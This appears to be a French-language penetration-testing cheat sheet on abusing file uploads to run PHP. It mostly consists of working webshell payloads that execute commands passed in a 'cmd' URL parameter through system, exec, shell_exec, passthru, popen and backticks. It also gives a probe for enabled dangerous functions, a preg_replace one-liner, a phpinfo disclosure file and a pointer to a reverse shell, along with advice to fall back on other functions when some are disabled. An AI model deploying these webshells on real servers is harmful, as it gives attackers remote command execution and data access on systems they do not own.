# PHP

![](logo.png)

**Facteur de risque** : RCE via webshell, Information DIsclosure

**Extension** : `.php`, `.php3`, `.php4`, `.php5`, `.php7`, `.phar`, `.phps`, `php-s`, `.phpt`, `.pht`, `.phtm`, `.phtml`, `.inc`

**Description** : **PHP: Hypertext Preprocessor**, plus connu sous son sigle **PHP**, est un "langage de programmation" libre, principalement utilisé pour produire des pages Web dynamiques via un serveur HTTP (*Apache, lighttpd, nginx...*).

## Sommaire

- Remote Code Execution

- Information Disclosure

## Remote Code Execution

PHP possède plusieurs fonctions qui permettent d'exécuter des commandes : `system`, `exec`, `shell_exec`, `passthru`,`popen`, `proc_open`, et l'utilisation de backticks. Certaines de ces fonctions peuvent être désactivés pour des raisons de sécurités. Essayez dans ce cas les autres fonctions, au cas où s'ils ont oublié.

### Pré-requis

- Le fichier doit être accessible après avoir été uploadé

- Le serveur doit supporter le PHP

- Les fonctions d'exécution en PHP doivent être activés

- Les fichiers stockés doivent être exécutés via PHP (même pour les images)
  
  - Impossible de nos jours. La configuration par défaut de PHP consiste à exécuter l'interpréteur PHP uniquement pour les fichiers .php, à l'aide de NGinx, Apache, Lighttpd etc...

### Payload

#### system

```php
<?php
echo "<pre>";
system($_GET['cmd']);
echo "</pre>";
?>
```

La fonction `system` accepte la commande comme paramètre de la fonction, puis affiche le résultat.

Pour lui envoyer des commandes, ajouter `?cmd=` suivi de la commande souhaité. La commande dépendra du serveur (`dir` sur Windows ou `ls`Linux par exemple).

Prends l'entrée de la commande dans l'URL : example.com/system.php?cmd=whoami

#### exec

```php
<?php
exec($_GET['cmd'], $array);
echo "<pre>";
print_r($array);
echo "</pre>";
?>
```

La fonction `exec` accepte la commande comme paramètre de la fonction, mais n'affiche pas de sortie. Il faut spécifier un deuxième paramètre (ici `$array`) pour avoir le résultat sous forme de tableau. Puis `print_r` est utilisé pour afficher le résultat.

Pour lui envoyer des commandes, ajouter `?cmd=` suivi de la commande souhaité. La commande dépendra du serveur (`dir` sur Windows ou `ls`Linux par exemple).

#### shell\_exec

```php
<?php
$output = shell_exec($_GET['cmd']);
echo "<pre>$output</pre>"
?>
```

La fonction `shell_exec` accepte la commande comme paramètre de la fonction, et retourne le résultat sous forme ce chaîne. Puis `echo` est utilisé pour afficher le résultat.

Pour lui envoyer des commandes, ajouter `?cmd=` suivi de la commande souhaité. La commande dépendra du serveur (`dir` sur Windows ou `ls`Linux par exemple).

#### passthru

```php
<?php
passthru($_GET['cmd']);
?>
```

La fonction `passthru` accepte la commande comme paramètre de la fonction, et affiche le résultat brut.

Pour lui envoyer des commandes, ajouter `?cmd=` suivi de la commande souhaité. La commande dépendra du serveur (`dir` sur Windows ou `ls`Linux par exemple).

#### popen

```php
<?php
$handle = popen($_GET['cmd'],'r');
echo "<pre>".fread($handle,4096)."</pre>";
pclose($handle);
?>
```

La fonction `popen` crée un processus, qui est terminé avec `pclose`.

Pour lui envoyer des commandes, ajouter `?cmd=` suivi de la commande souhaité. La commande dépendra du serveur (`dir` sur Windows ou `ls`Linux par exemple).

#### Backticks `

```php
<?php
$output = `$_GET['cmd']`;
echo "<pre>$output</pre>";
?>
```

PHP exécute le contenu entre backticks comme des commandes. Puis le résultat est affiché avec `echo`, avec les balises `<pre>` pour garder le résultat préformaté.

Pour lui envoyer des commandes, ajouter `?cmd=` suivi de la commande souhaité. La commande dépendra du serveur (`dir` sur Windows ou `ls`Linux par exemple).

#### proc_open

La fonction `proc_open` est plus complexe à utiliser. Elle est utilisé dans le reverse shell de  pentestmonkey.net : http://pentestmonkey.net/tools/php-reverse-shell .

Ce script est conçu pour les situations où, lors d'un test d'intrusion, une fonction de téléversement de fichiers existe, et que le serveur web qui exécute le PHP.

Exécutez le fichier en accédant à son URL. Le script ouvrira une connexion TCP du serveur web vers un hôte et un port de votre choix.

Si, pour une raison ou une autre, le webshell ne fonctionne pas, nous pouvons passer aux commandes à l'ancienne comme system, exec, shell\_exec, passthru... etc. 

### Quels fonctions sont activés ?

Le code PHP suivant permet de déterminer les fonctions dangereuses autorisés :

```php
<?php
echo "<pre>";
print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]));
echo "</pre>";
?>
```

D'autres webshells sont disponibles dans votre Kali Linux : /usr/share/webshells/PHP

#### preg\_replace

```php
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
```

## Information Disclosure

### Pré-requis

- Le fichier doit être accessible après avoir été uploadé

- Le serveur supporte le PHP

### Payload

La fonction `phpinfo` affiche de nombreuses informations sur la configuration de PHP, ce qui constitue une divulgation d'information.

**phpinfo.php**

```php
<?php
phpinfo();
?>
```

## References

[Web Shells 101 Using PHP (Web Shells Part 2) | Acunetix](https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/)

[PHP: popen - Manual](https://www.php.net/manual/en/function.popen.php)

https://www.dynamicciso.com/web-shells-in-php-detection-and-prevention-part-1/

[security - Exploitable PHP functions - Stack Overflow](https://stackoverflow.com/questions/3115559/exploitable-php-functions)

[[Résolu] Fonctions PHP plus exploitables | php | Prograide.com](https://prograide.com/pregunta/2693/fonctions-php-plus-exploitables)

[php-reverse-shell | pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

[Webshell &#xB7; Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html)

## Todo

- Vérifier les fonctions définies en PHP

- Faire un webshell avec proc\_open, pcntl\_exec ou eval(), preg\_match() avec le flag /e, show\_source, asser() (
  
  ```
  <?php @CENSORED($_POST['password']);?>)
  ```

- Ajouter les différents payloads avec les diférents extentsions de PHP

- Vérifier qu'un paramètre est présent

- 
